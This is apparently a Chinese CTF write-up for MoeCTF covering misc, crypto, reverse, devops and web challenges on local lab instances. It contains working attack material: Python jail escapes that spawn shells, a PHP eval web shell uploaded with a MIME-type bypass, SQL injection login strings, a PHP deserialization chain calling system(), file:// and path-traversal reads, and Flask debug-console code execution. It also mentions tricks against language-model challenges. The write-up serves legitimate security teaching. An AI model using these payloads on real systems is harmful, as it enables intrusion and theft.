
本篇 WP 涵盖 Misc 和 Web 大部分的题目，笔者：Zero6six。

### 安全杂项

#### Signin

进网页签完直接获得 flag。

#### 罗小黑战记

![](attachments/Pasted%20image%2020241010124226.png)

二维码内即为 flag。

#### 杂项入门指北

右侧为摩斯电码，随便找个地方转。

#### ez_Forensics

费一番力气装上 volatility 后先使用 `volatility -f flag.raw imageinfo` 得知使用 Win7SP1x64 作为 profile，然后使用 `python2.7 vol.py -f ../flag.raw --profile=Win7SP1x64 cmdscan` 得到如下结果：

![](attachments/Pasted%20image%2020241010131630.png)

#### Abnormal lag

丢进 Adobe Audition CC 拉下频谱，一段头，一段尾得到如下结果，配合正则表达式辨认 flag。

![](attachments/Pasted%20image%2020241010131940.png)

#### ez_F5

由 EXIF 信息也可看出是 F5 隐写。

![](attachments/Pasted%20image%2020241010132147.png)

![](attachments/Pasted%20image%2020241010132250.png)

由 StegSolve 的 File Format 得到 F5 的密码是 no_password。

研究 [CTF-OS](https://github.com/ProbiusOfficial/CTF-OS) 给的奇妙 F5 小工具得到要执行的命令：`java Extract C:\Users\LENOVO\Desktop\suantouwangba.jpg -p no_password`

执行之后从 output.txt 拿到 flag：moectf{F5_15_s0_lntere5t1n9}

#### moejail_lv1

小脚本拼接个字符串进 shell。

```python
from pwn import *

# 设置服务器地址和端口号
server_ip = '127.0.0.1'
server_port = 42387

# 创建TCP连接
connection = remote(server_ip, server_port)

# 接收服务器发送的数据
received_data = connection.recv().decode('utf-8')
send_data = received_data[-32:-26] + received_data[-23:-17]

# 输出接收到的数据
print(received_data)

connection.sendline(send_data.encode('utf-8'))

connection.interactive()

# 可以在这里添加对接收到的数据进行进一步处理的代码
# 例如：解析、保存到文件、发送进一步的请求等等

# 关闭连接
connection.close()
```

执行`__import__('os').system('sh')`，拿到 shell 之后  `cd ../../../tmp`，`ls -la` 发现隐藏的 flag 文本文件，但是不知道为啥没法直接 cat，可能文件名过长，不过没事，可以用通配符`cat .therealflag_7aeafbf44f4f26f484f3204cb*`

#### The upside and down

丢进 010 Editor，注意到开始为 28 06 24 EA 44 E4 54 94，恰好是 PNG 文件尾 49 45 4E 44 AE 42 60 82 一位位翻转的结果，据此拷打 GPT 叫他写个 python 脚本如下：

```python
def reverse_hex_digits(input_file, output_file):
    # 读取文件内容为二进制数据
    with open(input_file, 'rb') as f:
        data = f.read()

    # 将二进制数据转换为十六进制字符串，并移除 "0x" 前缀
    hex_string = data.hex()

    # 将十六进制字符串颠倒（按每个字符）
    reversed_hex_string = hex_string[::-1]

    # 将颠倒后的十六进制字符串转换回二进制数据
    reversed_data = bytes.fromhex(reversed_hex_string)

    # 将颠倒的数据写入输出文件
    with open(output_file, 'wb') as f:
        f.write(reversed_data)

if __name__ == "__main__":
    input_file = 'input.bin'   # 输入文件路径
    output_file = 'output.bin' # 输出文件路径
    reverse_hex_digits(input_file, output_file)
```

得到一个高糊二维码，但是小爱视觉扫的出来，结果：

```plaintext
where_is_the_flag?
https://balabala_towards:moectf{Fri3nds_d0n't_lie!}//
```

#### ctfer2077①

stegsolve 中 file format 发现一大堆额外信息，去 `strings -n 8 qrcode.png` 发现 `where is the flag? OK I give you some hints:incomplete LSB.@`。

stegsolve 捣鼓半天 LSB 发现是在 Red-0 的最上面。

![](attachments/Pasted%20image%2020241010164451.png)

#### ez_usbpcap

wireshark 发现 Keyboard 设备，在 Device address: 1，添加过滤器 `usb.device_address == 1 && usbhid.data`，左侧 HID Data 即为输入键码。

![](attachments/Pasted%20image%2020241010164642.png)

从 [USB HID 流量分析详解](https://www.p0ise.cn/misc/usb-hid-traffic-analysis.html)的键盘流量解析-脚本节得到键码表，进行吉列的手抄键码并对照按键。最终得到键码的输入（对照对了一年）：`6d6f656374667b6e3168613077307930756469616e6c33323435317d`。丢进 cyberchef 使用 magic，得到 `moectf{n1ha0w0y0udianl32451}`

#### moejail_lv2

还是用之前的小脚本过验证码，但本题对执行的代码有限制。

1. `["'0-8bd]`: 禁止使用 `"`、`'`、`0-8` 之间的数字和字母 `b`、`d`。
2. `[^\x00-\xff]`: 不能使用非ASCII字符，也就是只能使用0x00到0xFF范围内的ASCII字符。

忘记第一次怎么过的了，但是 10.10 写的时候想了个用 chr() 和数字 9 硬凑的方法。

```python
chr(int(99+9+9/9+9/9+9/9)) # o
chr(int(99+9+9-9/9-9/9))   # s
chr(int(99+9-9/9-9/9-9/9-9/9)) # h
__import__(chr(int(99+9+9/9+9/9+9/9))+chr(int(99+9+9-9/9-9/9))).system(chr(int(99+9+9-9/9-9/9))+chr(int(99+9-9/9-9/9-9/9-9/9))) # __import__('os').system('sh')
```

用第三个拿到 shell 之后 `cd ../../../tmp`, `ls`, `cat`。

#### 捂住一只耳

音频后半段仔细听，记下每个数字，是 1-10 的数字和 1-3 的数字组在一起，然后挨个报出。

前者是键盘上面的多少列，后者是行，例：q 是 11，r 是 41，z 是 13。

如此把听到的数转换成字母即为 flag。

#### readme

小脚本过验证码，把 hint 丢给 GPT，反复拷打得知 linux 下存在 proc/self/fd/ 这一特殊目录。

直接 /proc/self/fd/3 得到 flag。

#### moejail_lv3

小脚本过验证码，本题过滤所有数字和字母，google 搜索相关英文关键词发现信息：python 3.7 以上支持[斜体字母](https://lingojam.com/ItalicTextGenerator)作为关键字。

𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() 直接进 pdb，然后直接 import os，os.system('sh')，剩下的不再赘述。

#### moejail_lv4

小脚本过验证码，本体环境中`__builtins__`被扬了，在网上查找类似题目发现 `().__class__.__base__.__subclasses__()[-73].__init__.__globals__['system']('sh')` 是一种方法。但其中 `[-73]` 部分的值在不同机器不固定。

```python
a=r"().__class__.__base__.__subclasses__()["
c=r"].__init__.__globals__['system']('sh')"

for i in range (-1, -100, -1):
    b=str(i)
    d=a+b+c
    print(d)
```

写个脚本批量生成要注入的命令，然后耐试王自己一个个试，最终在 -73 拿到 shell。

#### Find It

在图片中可隐隐约约看到雄峰集团四个字，百度地图找到相关地点。

![](attachments/Pasted%20image%2020241010172617.png)

搜索幼儿园，发现俩都有”吉的堡“的，就是这俩。

![](attachments/Pasted%20image%2020241010172558.png)

#### 我的图层在你之上

自己之前叫 GPT 写过一个提取 pdf 漫画的，刚好用上。

```python
import fitz  # PyMuPDF
import os

def extract_raw_images_from_directory(input_directory, output_directory):
    # 检查输出目录是否存在，如果不存在，则创建它
    if not os.path.exists(output_directory):
        os.makedirs(output_directory)

    # 遍历指定目录中的所有文件
    for file_name in os.listdir(input_directory):
        if file_name.endswith('.pdf'):
            pdf_path = os.path.join(input_directory, file_name)
            doc = fitz.open(pdf_path)

            # 创建以PDF文件名命名的子文件夹
            pdf_folder_name = os.path.splitext(file_name)[0]  # 移除.pdf扩展名
            pdf_output_path = os.path.join(output_directory, pdf_folder_name)
            if not os.path.exists(pdf_output_path):
                os.makedirs(pdf_output_path)

            # 处理每一页的图片
            for i in range(len(doc)):
                for img_index, img in enumerate(doc.get_page_images(i)):
                    xref = img[0]
                    base_image = doc.extract_image(xref)
                    image_bytes = base_image["image"]  # 获取原始图片数据
                    image_ext = base_image["ext"]      # 图片格式
                    image_filename = f"page_{i}_img_{img_index}.{image_ext}"
                    image_full_path = os.path.join(pdf_output_path, image_filename)
                    with open(image_full_path, 'wb') as img_file:
                        img_file.write(image_bytes)
                    print(f"Extracted {image_full_path}")

# 输入和输出目录
input_directory = r"D:\1ADevelop\project\gadgets\temp\comic\original"
output_directory = r"D:\1ADevelop\project\gadgets\temp\comic\extract"
extract_raw_images_from_directory(input_directory, output_directory)
```

得到俩图，只要黑的那张，丢进 StegSolve 得到压缩包密码，打开是个凯撒密码。

![](attachments/Pasted%20image%2020241010190708.png)

![](attachments/Pasted%20image%2020241010190944.png)

#### 时光穿梭机

搜索”伦敦知名画报“得到关键词”伦敦新闻画报“，在各种学术网站翻找半天，最后还是 wikimedia 强。

![](attachments/Pasted%20image%2020241011001104.png)

![](attachments/Pasted%20image%2020241011001211.png)

![](attachments/Pasted%20image%2020241011002153.png)

街景地图得到`moectf{han_fang_tang}`

#### ctfer2077②

在[核心价值观密码在线解密](http://www.hiencode.com/cvencode.html)解密得到加密卷的密码 `p@55w0rd`，在 VeraCrypt 得到密码来挂载卷，用 WinHEX 打开加密卷，由文件名“小鹤”得知用的是小鹤双拼加密。

![](attachments/Pasted%20image%2020241010191506.png)

不想影响电脑输入法，手机用小鹤双拼得到：`双拼真的很有意思不是吗key就是下面折断话得全拼小写双拼事这样打字得`，因此 flag 为 `moectf{shuangpinshizheyangdazide}`。

#### ctfer2077③

在 wireshark 中使用 文件-导出对象-HTTP，然后把提交的 form-data 保存下来，用压缩软件打开。解压出 brainfuck.mp3, flag.gif 和 flag.zip。

![](attachments/Pasted%20image%2020241010192834.png)

得到 key：C5EZFsC6，该 key 用于 MP3 隐写，使用 MP3Stego 工具执行 `./decode.exe -X -P C5EZFsC6 C:\Users\LENOVO\Desktop\brainfuck.mp3`，在输出的文本文件中得到其名字提示的 [brainfuck 码](https://ctf.bugku.com/tool/brainfuck)，这个码用来解压 flag.zip。

![](attachments/Pasted%20image%2020241010193310.png)

flag.zip 内文本文件减小字体大小得到[福尔摩斯跳舞的小人密码](https://rumkin.com/tools/cipher/dancing-men/)，看的眼睛都要瞎了，得到密码 `PEOPLEDANCINGHAPPILY`，按照题目要求以下划线分割并加上包裹得到 flag：`moectf{PEOPLE_DANCING_HAPPILY}`

![](attachments/Pasted%20image%2020241010193509.png)

### 大语言模型应用安全

#### Neuro?

![](attachments/Pasted%20image%2020241010195200.png)

#### Evil?

![](attachments/Pasted%20image%2020241010225418.png)

再 ROT13 之后得`mocetf{41ee9781981eb839}`，幸好大语言模型挺聪明，只有 ec 俩字母错了，改成正确的即可。

#### 并非助手

![](attachments/Pasted%20image%2020241010202000.png)

#### 并非并非

全角字符是个好东西

![](attachments/Pasted%20image%2020241010202228.png)

### 二进制漏洞审计

#### 二进制漏洞审计入门指北

ncat 连上就能得到 moectf{Welcome_to_the_journey_of_Pwn}

#### NotEnoughTime

```python
from pwn import *

# 设置服务器地址和端口号
server_ip = '127.0.0.1'
server_port = 46227

def send():
    try:
        rec = connection.recvuntil(b'= ').decode('utf-8')
        print(rec,end='')
        sendNum = str(eval(rec[:-3].replace('/', '//').replace("\n", '')))
        print(sendNum)
        connection.sendline(sendNum.encode('utf-8'))
    except EOFError:
        rec = connection.recvall().decode('utf-8')
        print(rec)

# 创建TCP连接
connection = remote(server_ip, server_port)

connection.sendline(b'2')
connection.sendline(b'0')

rec = connection.recvuntil(b'ED!\n').decode('utf-8')
print(rec)

breakpoint()
# pdb 内手动调用 send()，可以改成 while 循环。

connection.interactive()
connection.close()
```

![](attachments/Pasted%20image%2020241011011028.png)

### 开发与运维基础

#### 运维入门指北

本题我使用 `FinalShell` 软件，图形化界面可以直接删除 bak，然后进行如下操作

```shell
su # 切换成 root 用户

# 以下脚本来自 GPT ########
#!/bin/bash

# 目标根目录
target_base="/var/www/html"

# 处理 .xml 文件：重命名为 .html 并分类
for file in *.xml; do
  # 判断文件是否存在，避免没有 .xml 文件时报错
  if [[ -f "$file" ]]; then
    # 获取文件的基础名字（不含后缀）
    base_name="${file%.xml}"

    # 将 .xml 文件重命名为 .html
    new_name="${base_name}.html"
    mv "$file" "$new_name"

    # 生成目标目录的路径 (如 f572d396fae9206628714fb2ce00f72e94f2258f.txt -> f5/72/f572d396fae9206628714fb2ce00f72e94f2258f.txt)
    prefix1="${base_name:0:2}"  # 前两位
    prefix2="${base_name:2:2}"  # 第三和第四位

    # 创建目标目录，如果目录不存在，基于 /var/www/html
    target_dir="${target_base}/${prefix1}/${prefix2}"
    mkdir -p "$target_dir"

    # 将重命名后的文件移动到目标目录
    mv "$new_name" "$target_dir/"
  fi
done

# 处理 .txt 文件：直接分类
for file in *.txt; do
  # 判断文件是否存在，避免没有 .txt 文件时报错
  if [[ -f "$file" ]]; then
    # 获取文件的基础名字（不含后缀）
    base_name="${file%.txt}"

    # 生成目标目录的路径 (如 f572d396fae9206628714fb2ce00f72e94f2258f.txt -> f5/72/f572d396fae9206628714fb2ce00f72e94f2258f.txt)
    prefix1="${base_name:0:2}"  # 前两位
    prefix2="${base_name:2:2}"  # 第三和第四位

    # 创建目标目录，如果目录不存在，基于 /var/www/html
    target_dir="${target_base}/${prefix1}/${prefix2}"
    mkdir -p "$target_dir"

    # 将 .txt 文件移动到目标目录
    mv "$file" "$target_dir/"
  fi
done

echo "All .xml files have been renamed to .html and moved to /var/www/html."
echo ".txt files have been moved to /var/www/html."
########
cd /var/log/nginx/
cat access.log # 得到 flag：moectf{YeS_d3vOpS-is-THE-JOB_FoR_tHe_Gre@T_INT3rnET5f}
```

#### 哦不！我的libc！

使用 `ssh root@127.0.0.1 -p <端口>` 连接到服务器，然后 `echo $(< /flag.txt)`。原理：`echo` 是 shell 内置的命令，不依赖于外部库，且可以通过 I/O 重定向读取文件。

### 逆向工程

#### 逆向工程入门指北

pdf 里的 C 代码运行了就行。

#### xor

![](attachments/Pasted%20image%2020241011014131.png)

IDA 阅读得知该程序将输入字符与 0x24 异或之后与另一个值作比较，则只需要把另一个值和 0x24 异或即得 flag，python 脚本如下：

```python
# byte_1400022B8 的字节数组
byte_1400022B8 = [
    73, 75, 65, 71, 80, 66, 95, 65, 28, 22, 70, 16, 19,
    28, 64, 9, 66, 22, 70, 28, 9, 16, 16, 66, 29, 9,
    70, 21, 20, 20, 9, 23, 22, 20, 65, 64, 64, 22,
    20, 71, 18, 64, 20, 89
]

# 恢复 flag
flag = ''.join([chr(b ^ 0x24) for b in byte_1400022B8])

# 打印结果
print(f"Recovered flag: {flag}") # moectf{e82b478d-f2b8-44f9-b100-320edd20c6d0}
```

#### upx

使用 Exeinfo 工具得知使用 upx 加壳，使用 `upx.exe -d` 脱壳后丢进 IDA 进行分析，直接就能看到 flag：`moectf{ec5390dd-f8cf-4b02-bc29-3bb0c5604c29}`。

![](attachments/Pasted%20image%2020241011015542.png)

### 现代密码学

#### 现代密码学入门指北

```python
from sympy import mod_inverse
from Crypto.Util.number import long_to_bytes

p = 197380555956482914197022424175976066223
q = 205695522197318297682903544013139543071
n = 40600296529065757616876034307502386207424439675894291036278463517602256790833
e = 65537
c = 36450632910287169149899281952743051320560762944710752155402435752196566406306

# Step 1: Calculate φ(n)
phi_n = (p - 1) * (q - 1)

# Step 2: Calculate the private key d
d = mod_inverse(e, phi_n)

# Step 3: Decrypt the ciphertext c to get the message m
m = pow(c, d, n)

# Step 4: Convert m back to the original message
flag = long_to_bytes(m)
print(flag) # moectf{the_way_to_crypto}
```

#### Signin

```python
from Crypto.Util.number import long_to_bytes, inverse

# 给定的参数
c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746
pq = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462
qp = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860
n = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903
p_q = 279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496

# 解方程恢复 p 和 q
from sympy import symbols, Eq, solve

p, q = symbols('p q', integer=True, positive=True)
eq1 = Eq((p - 1) * (q - 2), pq)
eq2 = Eq((q - 1) * (p - 2), qp)
eq3 = Eq(p + q, p_q)
solutions = solve([eq1, eq2, eq3], (p, q))

# 选择正确的解
for sol in solutions:
    if sol[0] * sol[1] == n:
        p, q = sol
        break

# 计算私钥 d
phi_n = int((p - 1) * (q - 1))
e = 65537
d = inverse(e, phi_n)

# 解密得到消息 m
m = pow(c, d, n)
flag = long_to_bytes(m)
print(flag.decode()) # moectf{Just_4_signin_ch4ll3ng3_for_y0u}
```

#### ez_hash

```python
import hashlib

# 给定的哈希值
target_hash = "3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a"

# 初始值
prefix = b"2100"

# 尝试所有可能的数字后缀
for i in range(1000000):  # 生成000000到999999
    suffix = f"{i:06}".encode()  # 将整数格式化为6位数，并编码为字节串
    secrets = prefix + suffix
    hash_value = hashlib.sha256(secrets).hexdigest()
    if hash_value == target_hash:
        print(f"Found secrets: {secrets}")
        break
# Found secrets: b'2100360168'
# moectf{2100360168}
```
  
### Web渗透测试与审计

#### Web渗透测试与审计入门指北

使用 phpstudy 搭建网站得到 flag：`moectf{H3r3'5_@_flYinG_kIss_f0r_yoU!}`

#### 弗拉格之地的入口

由信息“爬虫”可知在 robots.txt，进入对应界面拿到 flag：`moectf{CongR4TuLaT1oN_f0R_know1Ng-rObOt5-tXt1353a}`

#### 垫刀之路01: MoeCTF？启动！

env 命令拿到 flag：`moectf{WelCOme-To_mO3cTF-@nD-Road1-sT4RTup-By-5XRHhhb7}`

#### ez_http

```python
import requests

# Get
url = "http://127.0.0.1:3305/?xt=大帅b"

# Post
data = {
    'imoau':'sb'
}

headers = {
    'Referer': 'https://www.xidian.edu.cn/', # Source
    'User-Agent': 'MoeDedicatedBrowser',     # UA
    'X-Forwarded-For': '127.0.0.1'           # 伪造请求源
}

# Cookie
cookies = {
    'user': 'admin'
}

response = requests.post(url, data=data, headers=headers, cookies=cookies)

# 输出响应内容
print(response.text)
```

通过多次发请求完善提交的数据，得到如上代码，最终得到 `moectf{YoU_@re_real1Y_reaLly-v3rY-cIEVer!!!487ee}`。

#### ProveYourLove

```python
import requests

url = 'http://127.0.0.1:11539/questionnaire'

data = {
  "nickname": "1",
  "user_gender": "male",
  "target": "1",
  "target_gender": "male",
  "message": "1",
  "anonymous": "false"
}

headers = {
    'Content-Type': "application/json"
}

for i in range(300):
    response = requests.post(url=url, json=data, headers=headers)
    print(i)

print(response.text)
```

抓一次提交的数据之后写出如上请求，刷新页面得到 flag：`moectf{C0NgR4Tul@TI0ns_0N-bECoMlnG_a-I1CKINg-DOg99}`

#### 弗拉格之地的挑战

跳转 flag1ab.html，审查元素得到 flag1: bW9lY3Rm

跳转 flag2hh.php，在响应标头中得到 flag2: e0FmdEV

跳转 flag3cad.php，执行如下代码得到 flag3: yX3RoMXN

```python
import requests

url = 'http://127.0.0.1:4419/flag3cad.php?a=1'

data = {
    'b': 1
}

cookies = {
    'verify': 'admin'
}

response = requests.post(url, data=data, cookies=cookies)

print(response.text)
```

跳转 flag4bbc.php，在 HackBar 插件内修改 Referer 请求头为 `http://localhost:8080/flag3cad.php?a=1`，审查元素手动添加第九个按钮并在开始后按下，在控制台中得到 flag4: fdFVUMHJ。

跳转 flag5sxr.php，执行如下代码，得到 flag5: fSV90aDF。

```python
import requests

url = 'http://127.0.0.1:4419/flag5sxr.php'

data = {
    'content': 'I want flag'  # flag5
}

response = requests.post(url=url, data=data)

print(response.text)
```

跳转 flag6diw.php，审计 PHP 代码得知需要 GET 和 POST 一个 moe 参数，其中 GET 的 moe 参数的值不能严格匹配上 flag，但是要忽略大小写匹配上 flag，因此用如下代码得到 flag6: rZV9VX2t。

```python
import requests

url = 'http://127.0.0.1:4419/flag6diw.php?moe=Flag'

data = {
    'moe': 1
}

response = requests.post(url=url, data=data)

print(response.text)
```

跳转 flag7fxxkfinal.php，向其 POST 的 what 参数会被 PHP 执行，因此调用 PHP 的调用系统命令的命令，在多次 ls 后写出如下脚本得到 flag7: rbm93X1dlQn0=。

```python
import requests

url = "http://127.0.0.1:4419/flag7fxxkfinal.php"
data = {
    "what": "system('cat ../../../tmp/flag7');"
}

response = requests.post(url, data=data)

print(response.text)
```

拼接所有的 flag，得到 `bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0=`，丢进 CyberChef 使用 magic 得到 flag：`moectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}`。

#### ImageCloud前置

将 php 丢给 GPT 审计，得到如下信息：

> [!info]
> cURL 的配置，可能允许使用 `file://` 协议读取服务器的本地文件。

访问 http://127.0.0.1:6854/index.php?url=file:///etc/passwd ，得到 flag：`moectf{I-aM-VeRy-SORry-4b0UT-TH151942cf97}`。

#### 垫刀之路02: 普通的文件上传

上传 php 一句话木马。

```php
<?php @eval($_GET['cmd']); ?>
```

然后访问 `http://127.0.0.1:9185/uploads/php_hack.php?cmd=system(%27env%27);`，得到 flag：`moectf{Up1O4D_YOUr-PaYl0Ad_aNd_d0_what-Y0Ur_WaNt827}`。

#### 垫刀之路03: 这是一个图床

先用 BurpSuite 的浏览器在垫刀之路 02 上传时抓个包。

```plaintext
POST /upload.php HTTP/1.1
Host: 127.0.0.1:9518
Content-Length: 230
sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryUBDAGvGQpGUuanjA
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:9518
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:9518/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryUBDAGvGQpGUuanjA
Content-Disposition: form-data; name="image"; filename="php_hack.php"
Content-Type: application/octet-stream

<?php @eval($_GET['cmd']); ?>
------WebKitFormBoundaryUBDAGvGQpGUuanjA--
```

再在本题环境上传个图片抓个包。

```plaintext
POST /upload.php HTTP/1.1
Host: 127.0.0.1:5499
Content-Length: 838
sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary68MhvlQ0R2yXKV7r
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:5499
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:5499/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary68MhvlQ0R2yXKV7r
Content-Disposition: form-data; name="image"; filename="PixPin_2024-10-11_14-35-49.jpg"
Content-Type: image/jpeg

��������������������
------WebKitFormBoundary68MhvlQ0R2yXKV7r--
```

对后一个选择 `Send to Repeater`，然后改一下写成如下样子，再访问 `http://127.0.0.1:5499/uploads/php_hack.php?cmd=system(%27env%27);` 即可拿到 flag：`moectf{Byp@Ss_THe_mIME-typE-4nd_eXt3n5lOn_yoU-C4N_do-1T3}`。

```plaintext
POST /upload.php HTTP/1.1
Host: 127.0.0.1:5499
Content-Length: 216
sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary68MhvlQ0R2yXKV7r
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:5499
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:5499/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary68MhvlQ0R2yXKV7r
Content-Disposition: form-data; name="image"; filename="php_hack.php"
Content-Type: image/jpeg

<?php @eval($_GET['cmd']); ?>
------WebKitFormBoundary68MhvlQ0R2yXKV7r--
```

#### 垫刀之路05: 登陆网站

用户名 `admin123 ' #`，密码任意，通过 SQL 注入得到 flag：`moectf{HaVE-THe_UseFuL_Pas5WOrd_@nd_G0-3verYwH3Re-0nLy_5Ql_can_do0}`。

#### 垫刀之路06: pop base mini moe

审计源码，得知：

- B 类在被当作方法调用并传入 c 参数时，会向它的 b 属性方法传入 c 参数。
- A 类有 evil 和 a 属性，A 类对象析构时会向 a 属性方法传入 evil 参数。

那我们只需让 A 类实例自毁时调用 a 属性（即 B 类实例），传入的 evil 参数作为 B 类实例的 b 属性方法（即 system 函数）的参数执行，由此实现 RCE。

构造 payload：

```php
<?php
class A {
    private $evil;
    private $a;
}

class B {
    private $b;
}

// B类的b属性是 system 函数，同时用反射把 private 改成 public
$b = new B();
$bReflection = new ReflectionClass($b);
$bProperty = $bReflection->getProperty('b');
$bProperty->setAccessible(true);
// 将b对象的b属性改成system函数，此时调用b对象会调用b方法传参
$bProperty->setValue($b, 'system');

// A类的a属性是B类的实例，evil属性是我们要执行的命令
$a = new A();
$aReflection = new ReflectionClass($a);
$aPropertyA = $aReflection->getProperty('a');
$aPropertyA->setAccessible(true);
$aPropertyA->setValue($a, $b);      // 将a对象的a属性改成b对象。

$aPropertyEvil = $aReflection->getProperty('evil');
$aPropertyEvil->setAccessible(true);
// 将a对象的evil属性改成想执行的命令，比如 'ls', 'whoami' 等。
$aPropertyEvil->setValue($a, 'env'); 

echo urlencode(serialize($a));
```

访问 `http://127.0.0.1:4856/?data=O%3A1%3A%22A%22%3A2%3A%7Bs%3A7%3A%22%00A%00evil%22%3Bs%3A3%3A%22env%22%3Bs%3A4%3A%22%00A%00a%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A4%3A%22%00B%00b%22%3Bs%3A6%3A%22system%22%3B%7D%7D` 得
到 flag：`moectf{Ple4se-KiCK-CfbB_63c@us3_HE-r@1se_p0pm0E-in_WEEk1_haha0}`。

改良：可以通过覆写构造方法来不用反射构造 payload，另外，**如果有字符串和某个全局函数的名字相同，可以直接用它来调用该函数**，据此可实现一部分绕过。

#### 垫刀之路07: 泄漏的密码

Flask 框架的调试模式在 /console/，进入之后输入 PIN 码，然后 `print(__import__('os').popen('cat flag').read())` 得到 flag：`moectf{Dont-UsInG-fIa5K_bY_dEBug-Mod_4nd-l3aK_YoUr_plNc}`。

#### 垫刀之路04: 一个文件浏览器

通过 .. 来访问任意目录，因此只需访问 http://127.0.0.1:5908/?path=/../../../../tmp/flag 拿到 flag：`moectf{Cros5_the-diRecT0Ry-@ND_you-maY-f1nd_EtC_P4sSWd22}`。

#### 静态网页

抓到名为 get/?id=1-53 的 json 格式数据，得到信息：`"flag": "Please turn to final1l1l_challenge.php"`，访问得到 php 代码。

审计代码，该代码要求 GET 参数 a，POST 参数 b，如果 a, b 均非空且均不是数字，以及 `a==0`，a 的 md5 等于 `b[a]` 即可拿到 flag。

由此我们可以让 a=0ab，`b[0ab]: 0aa69098421afb3fed2179a9ac2f39de` 作为一个数组。此时两者均不是数字，且 `a==0`（比较时会自动忽略后面），并且 `b[a]` 恰好就是 0ab 的 md5。

```python
import requests

# Get
url = "http://127.0.0.1:6060/final1l1l_challenge.php?a=0ab"

# Post
data = {
    'b[0ab]':'0aa69098421afb3fed2179a9ac2f39de'
}

response = requests.post(url, data=data)

# 输出响应内容
print(response.text)
```

执行拿到 flag：`moectf{Is_MY-W1f3_PIO-Ch4n_cute-oR-YouR-WiFE-lS-Php?135}`。

#### 电院_Backend

查 robots.txt 得到后台地址 /admin/，将附件丢给 GPT 反复拷打得到注入语句。

账号：

```sql
' UNION SELECT 1, 'admin@example.com', 'd41d8cd98f00b204e9800998ecf8427e' -- 
```

密码：`d41d8cd98f00b204e9800998ecf8427e`。

原理：这个注入通过 `UNION SELECT` 伪造出一个返回的合法记录，密码是空字符串的MD5（`d41d8cd98f00b204e9800998ecf8427e`）。

得到 flag：`moectf{1_dlD-Not_exPECt-y0u_TO_b3-5O_StRONg6e301}`。

#### pop moe

**分析源码**

- class000：自毁时调用 check 方法，在 pay10ad 不严格等于 0，或它们类型不同时执行 what 属性的方法。
- 处理：pay10ad 属性不等于0，what 属性为下文 class001 实例。
- 效果：执行 class001 实例方法。
  
- class001：调用此类实例相当于将该类实例的a属性的 payload 属性设置为该实例的 pay10ad 属性。
- 处理：a 属性为下述的 class002 对象，pay10ad 属性为“dangerous”方法字符串。
